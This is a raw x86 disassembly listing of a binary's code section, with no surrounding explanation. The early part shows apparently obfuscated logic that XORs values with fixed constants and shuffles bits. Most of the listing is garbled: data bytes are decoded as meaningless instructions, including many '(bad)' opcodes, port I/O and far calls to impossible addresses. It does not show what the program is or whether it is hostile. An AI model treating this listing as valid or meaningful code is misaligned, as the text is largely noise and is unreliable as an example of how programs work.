  409be9:	mov    ecx,DWORD PTR [ebp-0x48]
  409bec:	mov    edx,DWORD PTR [ebp-0x44]
  409bef:	xor    eax,edi
  409bf1:	xor    edx,edx
  409bf3:	or     eax,edx
  409bf5:	add    eax,DWORD PTR ds:0x422578
  409bfb:	shl    ecx,0x1e
  409bfe:	mov    DWORD PTR [ebp+0x14],eax
  409c01:	mov    eax,DWORD PTR [ebp-0x48]
  409c04:	mov    ecx,DWORD PTR [ebp-0x44]
  409c07:	shrd   eax,ecx,0x2
  409c0b:	shr    ecx,0x2
  409c0e:	mov    ecx,DWORD PTR [ebp-0x48]
  409c11:	mov    edx,DWORD PTR [ebp-0x44]
  409c14:	xor    eax,edi
  409c16:	shl    ecx,0x1e
  409c19:	xor    edx,edx
  409c1b:	or     eax,edx
  409c1d:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  409c21:	mov    eax,DWORD PTR [ebp+0x14]
  409c24:	add    BYTE PTR [eax],cl
  409c26:	mov    eax,DWORD PTR [ebp-0x38]
  409c29:	mov    ecx,DWORD PTR [ebp-0x34]
  409c2c:	shrd   eax,ecx,0x2
  409c30:	shr    ecx,0x2
  409c33:	mov    ecx,DWORD PTR [ebp-0x38]
  409c36:	mov    edx,DWORD PTR [ebp-0x34]
  409c39:	xor    edx,edx
  409c3b:	xor    eax,edi
  409c3d:	or     eax,edx
  409c3f:	add    eax,DWORD PTR ds:0x422578
  409c45:	shl    ecx,0x1e
  409c48:	mov    ecx,DWORD PTR [ebp-0x38]
  409c4b:	mov    edx,DWORD PTR [ebp-0x34]
  409c4e:	shrd   ecx,edx,0x2
  409c52:	xor    ecx,edi
  409c54:	shr    edx,0x2
  409c57:	mov    edx,DWORD PTR [ebp-0x38]
  409c5a:	mov    edi,DWORD PTR [ebp-0x34]
  409c5d:	xor    edi,edi
  409c5f:	or     ecx,edi
  409c61:	mov    cl,BYTE PTR [ebp+ecx*1-0x4]
  409c65:	or     BYTE PTR [eax],cl
  409c67:	shl    edx,0x1e
  409c6a:	mov    edx,DWORD PTR [ebx]
  409c6c:	mov    eax,DWORD PTR [ebx+0x4]
  409c6f:	mov    edi,DWORD PTR [ebx]
  409c71:	mov    ecx,DWORD PTR [ebx+0x4]
  409c74:	xor    edx,0xca79a577
  409c7a:	xor    eax,0x9c1b89e8
  409c7f:	shrd   edx,eax,0x2
  409c83:	xor    ecx,ecx
  409c85:	or     ecx,edx
  409c87:	mov    DWORD PTR [ebp+0x8],ecx
  409c8a:	mov    ecx,DWORD PTR [esi]
  409c8c:	mov    edx,DWORD PTR [esi+0x4]
  409c8f:	xor    edx,0x9c1b89e8
  409c95:	xor    ecx,0xca79a577
  409c9b:	mov    DWORD PTR [ebp+0x14],ecx
  409c9e:	mov    ecx,edx
  409ca0:	mov    edx,DWORD PTR [ebp+0x14]
  409ca3:	shrd   edx,ecx,0x2
  409ca7:	shr    eax,0x2
  409caa:	shl    edi,0x1e
  409cad:	mov    DWORD PTR [ebp-0x6c],eax
  409cb0:	mov    DWORD PTR [ebp-0x70],edx
  409cb3:	mov    edx,DWORD PTR [esi]
  409cb5:	mov    eax,0x40000000
  409cba:	xor    edi,eax
  409cbc:	or     edi,DWORD PTR [ebp-0x6c]
  409cbf:	mov    DWORD PTR [ebp+0x14],edx
  409cc2:	shl    DWORD PTR [ebp+0x14],0x1e
  409cc6:	xor    DWORD PTR [ebp+0x14],eax
  409cc9:	mov    DWORD PTR [ebp+0xc],edi
  409ccc:	jmp    0x40a0aa
  409cd1:	jbe    0x409d4e
  409cd3:	fstp   TBYTE PTR [edx+ebx*8-0x78e4c9e4]
  409cda:	ins    DWORD PTR es:[edi],dx
  409cdb:	cmp    DWORD PTR [esi+esi*2+0x49],0x14
  409ce0:	stos   BYTE PTR es:[edi],al
  409ce1:	int    0x39
  409ce3:	sbb    BYTE PTR [eax],bl
  409ce5:	sahf   
  409ce6:	adc    bl,BYTE PTR [eax]
  409ce8:	sbb    BYTE PTR [eax-0x61],cl
  409ceb:	cli    
  409cec:	sub    DWORD PTR [edi-0x5e22990b],edx
  409cf2:	pop    eax
  409cf3:	mov    bh,0x2b
  409cf5:	cmc    
  409cf6:	sub    BYTE PTR [eax+0x51],dh
  409cf9:	inc    ebx
  409cfa:	mov    edx,edx
  409cfc:	cmp    al,0x46
  409cfe:	arpl   ax,di
  409d00:	xor    BYTE PTR [edx+ebp*4-0x68],0x49
  409d05:	add    al,0xa7
  409d07:	jl     0x409ce0
  409d09:	fisub  DWORD PTR [edx+ecx*4-0x3c]
  409d0d:	xchg   esi,eax
  409d0f:	jbe    0x409cc3
  409d11:	out    0x19,eax
  409d13:	out    dx,eax
  409d14:	xor    ecx,DWORD PTR [esi+0x2c60c984]
  409d1a:	(bad)  
  409d1c:	jecxz  0x409d00
  409d1e:	jmp    0x409cae
  409d20:	mov    ds,WORD PTR [edx+0x76]
  409d23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d24:	into   
  409d25:	xor    ebx,DWORD PTR [edx+0x5156418a]
  409d2b:	sub    DWORD PTR [ebx+0x694fd80e],edx
  409d31:	mov    esp,0xc9cf1d56
  409d36:	jns    0x409dab
  409d38:	test   BYTE PTR [ebp+0x7de62ce6],0x0
  409d3f:	xor    eax,0x3caf990c
  409d44:	inc    ecx
  409d45:	lea    ecx,[edi+0x45fb70cf]
  409d4b:	sbb    ebp,DWORD PTR [ecx]
  409d4d:	repnz xchg esi,ebx
  409d50:	mov    cl,BYTE PTR [edi+0x1fb1ae0c]
  409d56:	xor    ebp,DWORD PTR [ecx]
  409d58:	pop    ds
  409d59:	jae    0x409d9b
  409d5b:	xor    edi,DWORD PTR [edx-0x2b35d8ed]
  409d61:	xor    al,0x5d
  409d63:	xchg   esi,eax
  409d64:	mov    bl,0xf2
  409d66:	push   es
  409d67:	test   eax,0x77376be7
  409d6c:	add    cl,cl
  409d6e:	sar    dh,cl
  409d70:	jbe    0x409d67
  409d72:	dec    ecx
  409d73:	add    BYTE PTR [eax],0xd9
  409d76:	sub    edi,esi
  409d78:	pandn  mm4,QWORD PTR [bx]
  409d7c:	retf   0xec0c
  409d7f:	jbe    0x409dcf
  409d81:	popf   
  409d82:	repz sbb eax,0x33fd7ac6
  409d88:	iret   
  409d89:	fisubr DWORD PTR [ecx+0xb]
  409d8c:	xchg   ecx,eax
  409d8d:	sbb    cl,bh
  409d8f:	stos   BYTE PTR es:[edi],al
  409d90:	jb     0x409dd6
  409d92:	mov    ?,WORD PTR [ecx+edi*4]
  409d95:	dec    edx
  409d96:	stc    
  409d97:	daa    
  409d98:	(bad)  
  409d99:	xor    edi,DWORD PTR [esi]
  409d9b:	sahf   
  409d9c:	sti    
  409d9d:	js     0x409dc2
  409d9f:	or     edi,DWORD PTR cs:[ebx+0xbc9ecc6]
  409da6:	mov    WORD PTR [ebx+0x44],es
  409da9:	sbb    BYTE PTR [edi-0x29731f2d],al
  409daf:	rcl    DWORD PTR [ebx-0xd],0xa7
  409db3:	cmp    edi,DWORD PTR [esi+0x64211149]
  409db9:	push   ebx
  409dba:	addr16 call 0x73e8211
  409dc0:	add    eax,0x964c2303
  409dc5:	pop    ecx
  409dc6:	in     eax,dx
  409dc7:	jbe    0x409d78
  409dc9:	into   
  409dca:	dec    edi
  409dcb:	nop
  409dcc:	ret    
  409dcd:	inc    ebx
  409dce:	and    BYTE PTR [ebx-0x2d],bh
  409dd1:	xchg   BYTE PTR [ecx-0xd],ch
  409dd4:	and    al,0xbf
  409dd6:	lea    eax,[ebx]
  409dd8:	xchg   edx,eax
  409dd9:	call   0x4757:0xcd16d251
  409de0:	aas    
  409de1:	arpl   WORD PTR [edi],cx
  409de3:	test   BYTE PTR [ecx],dh
  409de5:	dec    ebx
  409de6:	(bad)  
  409de7:	pop    edx
  409de8:	mov    bl,0xcd
  409dea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409deb:	fldenv [eax+0x65d464e9]
  409df1:	cwde   
  409df2:	sub    DWORD PTR [ebx-0x4a],esi
  409df5:	jl     0x409db5
  409df7:	repz dec edx
  409df9:	xor    DWORD PTR [eax],edx
  409dfb:	imul   ecx,esi,0x3e61d49d
  409e01:	fidiv  DWORD PTR [ebp+0x70]
  409e04:	retf   
  409e05:	lea    edi,[ecx+0x3d]
  409e08:	js     0x409e73
  409e0a:	mov    bh,0x27
  409e0c:	mov    esp,0xdc8d7435
  409e11:	adc    ebp,esp
  409e13:	sbb    bp,dx
  409e16:	idiv   DWORD PTR [edx+0x1a]
  409e19:	xchg   esi,eax
  409e1a:	ds int 0xed
  409e1d:	sub    al,0x58
  409e1f:	push   esp
  409e20:	inc    ebx
  409e21:	and    al,0x80
  409e23:	scas   eax,DWORD PTR es:[edi]
  409e24:	leave  
  409e25:	out    0xc3,al
  409e27:	into   
  409e28:	ret    0xabbc
  409e2b:	xchg   edi,eax
  409e2c:	out    0x5b,eax
  409e2e:	pop    ss
  409e2f:	mov    bl,0x8f
  409e31:	xchg   edx,eax
  409e32:	mov    ecx,0x11e413af
  409e37:	xchg   ecx,eax
  409e38:	sbb    bh,BYTE PTR ds:0x8a770422
  409e3e:	sub    BYTE PTR [edx+0x6f],ah
  409e41:	sbb    dl,BYTE PTR [ebx]
  409e43:	xchg   ch,bh
  409e45:	fidiv  DWORD PTR [eax-0x68]
  409e48:	addr16 xchg ebx,eax
  409e4a:	pop    es
  409e4b:	pop    edi
  409e4c:	test   al,0x22
  409e4e:	add    edi,DWORD PTR [ecx]
  409e50:	aad    0xd0
  409e52:	in     eax,dx
  409e53:	push   cs
  409e54:	ret    
  409e55:	sbb    bh,cl
  409e57:	push   edi
  409e58:	sahf   
  409e59:	pop    ecx
  409e5a:	int    0x11
  409e5c:	push   ss
  409e5d:	sbb    bh,BYTE PTR [ebx]
  409e5f:	xor    ah,ch
  409e61:	jge    0x409ec5
  409e63:	mov    al,ds:0xa9071e7b
  409e68:	fsubp  st(2),st
  409e6a:	inc    esp
  409e6b:	push   0x2c397c54
  409e70:	or     DWORD PTR [esi+0x6c],edx
  409e73:	les    eax,FWORD PTR [ebx]
  409e75:	adc    BYTE PTR [eax-0x18],cl
  409e78:	mov    bl,0x1
  409e7a:	daa    
  409e7b:	lahf   
  409e7c:	sbb    DWORD PTR [esi+0x1c],eax
  409e7f:	fimul  WORD PTR [ebx]
  409e81:	stc    
  409e82:	cwde   
  409e83:	mov    ah,0xa6
  409e85:	ror    BYTE PTR [ecx],0x3
  409e88:	lahf   
  409e89:	inc    ecx
  409e8a:	add    BYTE PTR [ebx+0x73],ah
  409e8d:	jbe    0x409efc
  409e8f:	sbb    ecx,edx
  409e91:	xchg   esi,eax
  409e92:	mov    ecx,0xdb9f9474
  409e97:	cmp    BYTE PTR [edx-0x7aac8c8f],bl
  409e9d:	push   ds
  409e9e:	push   ebp
  409e9f:	mov    eax,ds:0x4171c153
  409ea4:	sti    
  409ea5:	popa   
  409ea6:	je     0x409e83
  409ea8:	pop    ss
  409ea9:	retf   
  409eaa:	xchg   edi,eax
  409eab:	loop   0x409e67
  409ead:	sar    al,0xbc
  409eb0:	nop
  409eb1:	enter  0x385d,0x40
  409eb5:	std    
  409eb6:	sti    
  409eb7:	mov    ds:0x5fa298b3,al
  409ebc:	fisub  DWORD PTR [edx+edx*1]
  409ebf:	in     al,dx
  409ec0:	mov    al,0xd0
  409ec2:	inc    edi
  409ec3:	or     al,0xa3
  409ec5:	mov    es,ebp
  409ec7:	mov    bh,0x50
  409ec9:	cmp    BYTE PTR [ebp+0x69],dl
  409ecc:	add    BYTE PTR [esi+0x721e0abb],0x4a
  409ed3:	pusha  
  409ed4:	(bad)  
  409ed5:	ds lahf 
  409ed7:	lock jne 0x409eef
  409eda:	dec    eax
  409edb:	and    cl,BYTE PTR [ebx-0x392b4c05]
  409ee1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ee2:	js     0x409e9e
  409ee4:	pop    ebp
  409ee5:	pop    esi
  409ee6:	inc    edx
  409ee7:	mov    esi,0x8c835277
  409eec:	int    0xc5
  409eee:	fisub  WORD PTR [edx-0x4aee2ff]
  409ef4:	xor    dh,dh
  409ef6:	or     esp,eax
  409ef8:	mov    DWORD PTR [ecx],esp
  409efa:	xchg   ebx,eax
  409efb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409efc:	prefetchw (bad)
  409efd:	or     eax,0x45f122cb
  409f02:	mov    ds:0x5fa39eda,eax
  409f07:	xchg   DWORD PTR [ebx+edx*8],esp
  409f0a:	add    esi,esi
  409f0c:	(bad)  
  409f0d:	js     0x409eea
  409f0f:	xor    ch,bl
  409f11:	mov    eax,0x2c75807a
  409f16:	cs dec ebp
  409f18:	cmp    ecx,DWORD PTR ss:[ecx-0x6c]
  409f1c:	adc    DWORD PTR [eax],esp
  409f1e:	adc    al,0xb
  409f20:	mov    DWORD PTR [esi+0x3e],edi
  409f23:	sbb    DWORD PTR [edx-0x2248328b],ebx
  409f29:	sub    edx,DWORD PTR [esi]
  409f2b:	in     al,0xb5
  409f2d:	dec    ecx
  409f2e:	xchg   ebx,eax
  409f2f:	mov    edx,0x5dd34581
  409f34:	ins    BYTE PTR es:[edi],dx
  409f35:	jmp    0x8e4d1388
  409f3a:	and    edx,DWORD PTR [ecx]
  409f3c:	push   edi
  409f3d:	or     al,0x6b
  409f3f:	mov    edx,0x2f63d7dc
  409f44:	jecxz  0x409fb0
  409f46:	xchg   ecx,eax
  409f47:	xor    BYTE PTR [edi-0x5b4b843f],0x6f
  409f4e:	mov    eax,ds:0x54c0d1e0
  409f53:	add    BYTE PTR [edi-0x7a1d783a],dl
  409f59:	mov    al,0x52
  409f5b:	jae    0x409fb7
  409f5d:	jne    0x409f56
  409f5f:	outs   dx,DWORD PTR ds:[esi]
  409f60:	shr    BYTE PTR [ebx+ecx*2],1
  409f63:	xor    DWORD PTR [esi-0x1a],edx
  409f66:	pop    edi
  409f67:	push   edx
  409f68:	ins    DWORD PTR es:[edi],dx
  409f69:	test   BYTE PTR ds:0x21ae8f6f,cl
  409f6f:	outs   dx,BYTE PTR ds:[esi]
  409f70:	xchg   ebx,eax
  409f71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f72:	push   cs
  409f73:	fwait
  409f74:	xor    al,0xb8
  409f76:	and    esi,DWORD PTR [esi-0x27fa33d6]
  409f7c:	out    0x7c,al
  409f7e:	jle    0x409fd8
  409f80:	cmc    
  409f81:	arpl   WORD PTR [ebx],sp
  409f83:	(bad)  
  409f84:	mov    esp,0xe7c75e39
  409f89:	mov    ebx,0x658d6624
  409f8e:	jno    0x409f9c
  409f90:	push   ecx
  409f91:	adc    eax,0x92eabd24
  409f96:	xchg   edx,eax
  409f97:	pop    ds
  409f98:	rcl    DWORD PTR [ecx-0x5],cl
  409f9b:	into   
  409f9c:	mov    ebp,0xd79b67dc
  409fa1:	adc    al,0x22
  409fa3:	fidivr DWORD PTR [ecx+0x3aab81dc]
  409fa9:	jb     0x40a014
  409fab:	rcr    BYTE PTR [ecx],0xf2
  409fae:	xchg   DWORD PTR [edi+esi*4-0xe9c0fbb],esi
  409fb5:	inc    ebp
  409fb6:	mov    al,ds:0x4409391c
  409fbc:	sub    DWORD PTR [eax-0x20],ebp
  409fbf:	xrelease xchg DWORD PTR [eax-0x2a],edx
  409fc3:	xor    bh,BYTE PTR [edx+0x6a]
  409fc6:	xor    ch,BYTE PTR ds:0xaf8c48e4
  409fcc:	push   esp
  409fcd:	mov    ah,0x8a
  409fcf:	ret    
  409fd0:	inc    edi
  409fd1:	push   esp
  409fd2:	cmp    eax,DWORD PTR [esi-0x13]
  409fd5:	fisub  DWORD PTR [ebx+0x4d095dea]
  409fdc:	adc    dl,BYTE PTR [ecx+0x50]
  409fdf:	lock pop ss
  409fe1:	es dec ebx
  409fe3:	or     cl,BYTE PTR [edx-0x20]
  409fe6:	test   al,0x2d
  409fe8:	mov    BYTE PTR [ebx],ah
  409fea:	mov    eax,0x19081e6d
  409fef:	push   ds
  409ff0:	call   0xfaeb:0x7a86ddfb
  409ff7:	adc    bh,BYTE PTR [edx]
  409ff9:	mov    ecx,0x8935030
  409ffe:	fdiv   QWORD PTR [ebx+0x506794a7]
  40a004:	mov    esi,0xc43f270a
  40a009:	and    eax,0x189ae491
  40a00e:	arpl   WORD PTR [edi],dx
  40a010:	hlt    
  40a011:	or     al,0x4b
  40a013:	dec    esp
  40a014:	sub    ebx,edx
  40a016:	add    BYTE PTR ds:0x8b45ec7e,0x24
  40a01d:	and    al,0x82
  40a01f:	icebp  
  40a020:	adc    al,0x93
  40a022:	dec    esi
  40a023:	loop   0x40a061
  40a025:	mov    ds:0x9ca6189b,al
  40a02a:	arpl   WORD PTR [ebp+0x71],ax
  40a02d:	push   ecx
  40a02e:	fdivrp st(2),st
  40a030:	inc    edi
  40a031:	push   ecx
  40a032:	jle    0x40a042
  40a034:	stc    
  40a035:	shl    DWORD PTR [ecx+edi*4-0x569eb4ce],cl
  40a03c:	jo     0x40a049
  40a03e:	dec    ebx
  40a03f:	test   eax,0xc2162780
  40a044:	jl     0x40a0a3
  40a046:	out    0x15,al
  40a048:	out    dx,al
  40a049:	outs   dx,BYTE PTR ds:[esi]
  40a04a:	out    0xe9,eax
  40a04c:	adc    BYTE PTR [esi-0x68f7ad5f],ch
  40a052:	mov    bl,0xa5
  40a054:	sti    
  40a055:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a056:	jl     0x40a08e
  40a058:	test   al,0x68
  40a05a:	dec    esi
  40a05b:	mov    eax,ds:0x1a26f042
  40a060:	(bad)  
  40a062:	or     cl,BYTE PTR [eax]
  40a064:	ret    0x1dc1
  40a067:	imul   ebx,DWORD PTR [edi+0x4a7b9c25],0x3330384a
  40a071:	sub    al,0xb8
  40a073:	add    bl,dh
  40a075:	in     eax,0x9d
  40a077:	hlt    
  40a078:	pop    eax
  40a079:	add    dh,dl
  40a07b:	xchg   BYTE PTR [eax+0x181af6f9],bh
  40a081:	push   ecx
  40a082:	ss fwait
  40a084:	(bad)  
  40a085:	not    DWORD PTR [ebp+0x14]
  40a088:	icebp  
  40a089:	out    0x84,eax
  40a08b:	xchg   BYTE PTR [edi+edi*8],al
  40a08e:	jne    0x40a10a
  40a090:	popf   
  40a091:	inc    ebp
  40a092:	retf   
  40a093:	mov    esp,0x4c449bf8
  40a098:	inc    ebp
  40a099:	or     esp,DWORD PTR [eax+ebp*1-0x42]
  40a09d:	retf   0x5082
  40a0a0:	sub    cl,dl
  40a0a2:	mul    DWORD PTR [ebx]
  40a0a4:	adc    dh,BYTE PTR [eax+0x2a]
  40a0a7:	dec    edi
  40a0a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0a9:	dec    esi
  40a0aa:	mov    edi,DWORD PTR [esi+0x4]
  40a0ad:	mov    edi,DWORD PTR [ebp+0x14]
  40a0b0:	xor    edx,edx
  40a0b2:	or     edx,DWORD PTR [ebp-0x70]
  40a0b5:	shr    ecx,0x2
  40a0b8:	or     edi,ecx
  40a0ba:	cmp    edx,DWORD PTR [ebp+0x8]
  40a0bd:	jne    0x40a9b0
  40a0c3:	cmp    edi,DWORD PTR [ebp+0xc]
  40a0c6:	jne    0x40a9b0
  40a0cc:	jmp    0x40a926
  40a0d1:	mov    eax,DWORD PTR [esi]
  40a0d3:	mov    edx,DWORD PTR [esi+0x4]
  40a0d6:	mov    eax,DWORD PTR [esi]
  40a0d8:	mov    edx,DWORD PTR [esi+0x4]
  40a0db:	xor    eax,0xca79a577
  40a0e0:	xor    edx,ecx
  40a0e2:	mov    ecx,eax
  40a0e4:	mov    eax,edx
  40a0e6:	shrd   ecx,eax,0x2
  40a0ea:	shr    eax,0x2
  40a0ed:	mov    DWORD PTR [ebp+0xc],eax
  40a0f0:	mov    eax,DWORD PTR [esi]
  40a0f2:	mov    edx,DWORD PTR [esi+0x4]
  40a0f5:	mov    edx,eax
  40a0f7:	xor    eax,eax
  40a0f9:	or     eax,ecx
  40a0fb:	mov    ecx,DWORD PTR [ebx]
  40a0fd:	shl    edx,0x1e
  40a100:	xor    edx,0x40000000
  40a106:	mov    DWORD PTR [ebp+0x10],eax
  40a109:	mov    eax,edx
  40a10b:	or     eax,DWORD PTR [ebp+0xc]
  40a10e:	mov    edx,DWORD PTR [ebx+0x4]
  40a111:	push   eax
  40a112:	push   DWORD PTR [ebp+0x10]
  40a115:	push   edx
  40a116:	push   ecx
  40a117:	jmp    0x40a4f5
  40a11c:	std    
  40a11d:	dec    ecx
  40a11e:	mov    ah,0xd2
  40a120:	sub    al,0x22
  40a122:	fidivr DWORD PTR [edi]
  40a124:	test   al,0x29
  40a126:	push   ebp
  40a127:	stos   BYTE PTR es:[edi],al
  40a128:	pop    es
  40a129:	or     edi,DWORD PTR [ecx+0x7c]
  40a12c:	push   edx
  40a12d:	xor    ebx,DWORD PTR [eax]
  40a12f:	sbb    BYTE PTR [esi+0x7181812],bl
  40a135:	sbb    DWORD PTR [ecx+0x58a70fde],edx
  40a13b:	adc    BYTE PTR [ebx-0x386322aa],ch
  40a141:	push   edi
  40a142:	adc    eax,0xc74912ef
  40a147:	add    cl,BYTE PTR [ebp+0x6a4969da]
  40a14d:	pop    ds
  40a14e:	inc    edi
  40a14f:	cld    
  40a150:	mov    al,ds:0xd9e4ff6
  40a155:	pop    esp
  40a156:	mov    DWORD PTR [ebx-0x3e88a42b],esi
  40a15c:	xor    al,0x98
  40a15e:	dec    edx
  40a15f:	(bad)  
  40a160:	pop    ebx
  40a161:	jmp    0x40a11c
  40a163:	push   0x33
  40a165:	pop    edi
  40a166:	cmp    edx,DWORD PTR [edi-0x2b230f07]
  40a16c:	(bad)  [esi+edi*8+0x515de8b1]
  40a173:	div    DWORD PTR [edx+edi*8]
  40a176:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a177:	cmp    eax,0x9d1a9222
  40a17c:	add    ebx,DWORD PTR [edi-0x30]
  40a17f:	dec    ebp
  40a180:	lods   al,BYTE PTR ds:[esi]
  40a181:	inc    ebx
  40a182:	mov    eax,ds:0x3943958c
  40a187:	in     al,0xa0
  40a189:	sub    edx,DWORD PTR [edi-0xb]
  40a18c:	jo     0x40a185
  40a18e:	jns    0x40a177
  40a190:	sub    al,0xf0
  40a192:	pop    es
  40a193:	call   0x82c31b9d
  40a198:	dec    ecx
  40a199:	sub    al,0xca
  40a19b:	pop    ebp
  40a19c:	sub    eax,0x823dc6a4
  40a1a1:	ret    
  40a1a2:	push   es
  40a1a3:	xlat   BYTE PTR ds:[ebx]
  40a1a4:	jg     0x40a1d8
  40a1a6:	test   BYTE PTR [edx+0x2c14ed81],bl
  40a1ac:	pop    edx
  40a1ad:	push   eax
  40a1ae:	ja     0x40a207
  40a1b0:	std    
  40a1b1:	mov    BYTE PTR [esi-0x416085c2],al
  40a1b7:	mov    ch,0xac
  40a1b9:	and    edi,DWORD PTR [ecx]
  40a1bb:	xchg   ebx,eax
  40a1bc:	sub    BYTE PTR [ecx],ch
  40a1be:	sub    cl,BYTE PTR [edx-0x56d4604f]
  40a1c4:	or     eax,0x586f9e9b
  40a1c9:	cmp    DWORD PTR [esi],ebp
  40a1cb:	xchg   DWORD PTR [ecx],esi
  40a1cd:	icebp  
  40a1ce:	mov    ds:0x62350e99,eax
  40a1d3:	imul   ebp,edi,0x8cb35aa9
  40a1d9:	(bad)  
  40a1db:	inc    esi
  40a1dc:	or     al,0x6d
  40a1de:	and    esp,0x416d4c8b
  40a1e4:	mov    cl,0xdd
  40a1e6:	and    DWORD PTR [esi+0x0],esp
  40a1e9:	jmp    0x40a179
  40a1eb:	jno    0x40a1dd
  40a1ed:	fbld   TBYTE PTR [edi+0x1d]
  40a1f0:	imul   BYTE PTR [ebp+0x2a6aa683]
  40a1f6:	inc    ebx
  40a1f7:	sti    
  40a1f8:	or     bh,bl
  40a1fa:	arpl   WORD PTR [esi],bx
  40a1fc:	shr    al,0xf0
  40a1ff:	push   ds
  40a200:	xchg   DWORD PTR [ecx],esi
  40a202:	and    al,0xf8
  40a204:	pop    ebx
  40a205:	arpl   WORD PTR [ebp+ebx*8+0x62],di
  40a209:	int    0x62
  40a20b:	ins    BYTE PTR es:[edi],dx
  40a20c:	das    
  40a20d:	scas   eax,DWORD PTR es:[edi]
  40a20e:	jmp    0x40a1ea
  40a210:	mov    ah,0x4a
  40a212:	les    ebx,FWORD PTR [edx]
  40a214:	lock mov ebp,0x7452e462
  40a21a:	(bad)  
  40a21c:	call   0x918e:0xba563401
  40a223:	fs out dx,eax
  40a225:	stc    
  40a226:	mov    dl,0x8b
  40a228:	cmp    cl,dl
  40a22a:	retf   0x6921
  40a22d:	push   ebp
  40a22e:	hlt    
  40a22f:	mov    ebp,0x7bf5a21f
  40a234:	adc    dl,BYTE PTR [edi+0x3d9d71ab]
  40a23a:	cdq    
  40a23b:	leave  
  40a23c:	mov    cl,0xcf
  40a23e:	dec    ebx
  40a23f:	cmp    edx,eax
  40a241:	pop    eax
  40a242:	inc    esi
  40a243:	jb     0x40a289
  40a245:	(bad)  
  40a247:	fwait
  40a248:	je     0x40a21e
  40a24a:	fwait
  40a24b:	imul   BYTE PTR [edi-0x40]
  40a24e:	add    BYTE PTR [edi+0x58],ah
  40a251:	jp     0x40a270
  40a253:	test   eax,0x28d7c49a
  40a258:	push   cs
  40a259:	bound  ebx,QWORD PTR cs:[ebp-0x2df20830]
  40a260:	pop    ecx
  40a261:	xor    BYTE PTR [edx+0x7ff2ae7c],0x8a
  40a268:	(bad)  
  40a269:	bound  ebp,QWORD PTR [ebx+0x10a10132]
  40a26f:	outs   dx,DWORD PTR ds:[esi]
  40a270:	mov    al,0xb1
  40a272:	imul   DWORD PTR [ebx-0xb]
  40a275:	shl    cl,0x15
  40a278:	add    al,0x14
  40a27a:	outs   dx,DWORD PTR ds:[esi]
  40a27b:	out    dx,eax
  40a27c:	push   0x63
  40a27e:	(bad)  
  40a27f:	inc    esp
  40a280:	minps  xmm5,XMMWORD PTR [eax]
  40a283:	add    ecx,ecx
  40a285:	cmp    ah,BYTE PTR [ecx+0x3b82e6bb]
  40a28b:	sub    ebx,0x164fbd2f
  40a291:	xchg   esi,eax
  40a292:	jno    0x40a2a7
  40a294:	test   al,0xea
  40a296:	push   cs
  40a297:	lods   al,BYTE PTR ds:[esi]
  40a298:	(bad)  
  40a299:	push   ss
  40a29a:	xchg   ebx,eax
  40a29b:	mov    BYTE PTR [ecx-0x39],bh
  40a29e:	mov    eax,0x80c096d4
  40a2a3:	inc    ebp
  40a2a4:	jmp    0xd4dc928
  40a2a9:	std    
  40a2aa:	sub    esi,DWORD PTR [edi]
  40a2ac:	push   edx
  40a2ad:	cmp    cl,BYTE PTR ds:0x61b4e017
  40a2b3:	mov    bl,cl
  40a2b5:	fidivr DWORD PTR [ecx]
  40a2b7:	xor    bh,BYTE PTR [edx-0x637a3263]
  40a2bd:	lods   eax,DWORD PTR ds:[esi]
  40a2be:	lock xor BYTE PTR [edi-0xe4c77e0],0xf1
  40a2c6:	mov    edi,0xa3a8f665
  40a2cb:	ss pop es
  40a2cd:	or     DWORD PTR [ebp+0x5c69a271],esi
  40a2d3:	push   ds
  40a2d4:	jb     0x3b707c98
  40a2da:	adc    eax,0x78eac3fa
  40a2df:	dec    eax
  40a2e0:	xchg   edi,eax
  40a2e1:	adc    BYTE PTR [edx+0x4a],ah
  40a2e4:	popf   
  40a2e5:	mov    cl,0x2d
  40a2e7:	xchg   ecx,eax
  40a2e8:	cmp    eax,0xbbcf5315
  40a2ed:	cli    
  40a2ee:	and    DWORD PTR [esi-0x3d1a6760],0xff153c17
  40a2f8:	xchg   esp,eax
  40a2f9:	jns    0x40a27d
  40a2fb:	cmp    bh,0xbd
  40a2fe:	lods   al,BYTE PTR ds:[esi]
  40a2ff:	dec    BYTE PTR [esi-0xe]
  40a302:	test   BYTE PTR [esi-0x67f2d1c1],bl
  40a308:	test   eax,0x5cdc39df
  40a30d:	pop    eax
  40a30e:	mov    ah,BYTE PTR [ebx]
  40a310:	daa    
  40a311:	in     al,dx
  40a312:	in     al,dx
  40a313:	cdq    
  40a314:	push   0xffffffd9
  40a316:	sub    al,0x47
  40a318:	shl    DWORD PTR [ebp+0x78021a56],cl
  40a31e:	cmpps  xmm0,XMMWORD PTR [ebx],0xfd
  40a322:	lods   eax,DWORD PTR ds:[esi]
  40a323:	sbb    eax,0x3ffbecf5
  40a328:	or     al,0x5c
  40a32a:	imul   ecx,ecx,0x23
  40a32d:	fstp   TBYTE PTR [eax]
  40a32f:	mov    ch,0x6e
  40a331:	out    dx,eax
  40a332:	mov    ?,WORD PTR [ecx+0x5f]
  40a335:	fwait
  40a336:	or     DWORD PTR [edx],0x49ea43b7
  40a33c:	gs mov bl,0x8e
  40a33f:	and    eax,esp
  40a341:	and    edi,DWORD PTR [edi-0x6b]
  40a344:	mov    bl,0x2b
  40a346:	fiadd  DWORD PTR [ebp-0x1]
  40a349:	scas   eax,DWORD PTR es:[edi]
  40a34a:	mov    DWORD PTR [ebx+0x29],ebx
  40a34d:	je     0x40a2ff
  40a34f:	jg     0x40a370
  40a351:	je     0x40a2e0
  40a353:	ret    0x4b98
  40a356:	add    BYTE PTR [ecx+0x49],dl
  40a359:	repz lds edx,FWORD PTR [eax+edx*2]
  40a35d:	lock xor ecx,ecx
  40a360:	or     cl,BYTE PTR [ebx]
  40a362:	aam    0xe
  40a364:	aad    0x8f
  40a366:	mov    edi,DWORD PTR [edx-0x50]
  40a369:	cmc    
  40a36a:	lods   eax,DWORD PTR ds:[esi]
  40a36b:	xchg   ebx,eax
  40a36c:	cmp    DWORD PTR [ebp-0x341c082e],esp
  40a372:	pusha  
